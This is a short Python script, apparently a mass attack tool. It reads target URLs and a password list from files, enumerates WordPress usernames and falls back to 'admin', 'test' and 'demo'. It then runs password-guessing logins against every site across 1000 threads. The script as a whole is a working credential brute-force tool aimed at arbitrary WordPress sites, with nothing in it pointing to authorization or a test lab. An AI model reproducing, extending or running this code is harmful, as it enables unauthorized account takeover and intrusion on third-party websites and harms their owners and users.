from tools import wordpress
from tools import colorprint
import threading
import re
from urllib.parse import urlparse


def trigger(url, passwords):
    other_username = True
    url = wordpress.url2domain(url)
    usernames = wordpress.getwpusers.user_check(url)
    if usernames is None:
        if(other_username):
            #colorprint.colorprint(f"{url} Kullanıcı adı bulunamadı. admin ve test kullanıcı adları denenecek.", "w")
            #print("")
            usernames = ["admin","test","demo"]
        else:
            usernames = []
    if wordpress.is_wordpress(url):
        wordpress.fileread(url, usernames, passwords)

def process_urls(urls, passwords):
    for url in urls:
        trigger(url, passwords)

def clear_urls():
    with open("list.txt", "r") as f:
        urls = [url.strip() for url in f.readlines()]

    domains = []
    filtered_urls = []

    for url in urls:
        parsed_url = urlparse(url)
        domain = parsed_url.netloc
        if domain not in domains:
            domains.append(domain)
            filtered_urls.append(url)
    return filtered_urls

def main(num_threads):
    urls = clear_urls()
    colorprint.colorprint(f"Toplam url:{len(urls)}")

    with open("passwords.txt", "r") as f:
        passwords = [password.strip() for password in f.readlines()]

    num_urls = len(urls)
    chunk_size = (num_urls + num_threads - 1) // num_threads

    threads = []
    for i in range(0, num_urls, chunk_size):
        chunk = urls[i:i+chunk_size]
        t = threading.Thread(target=process_urls, args=(chunk, passwords))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    main(1000)
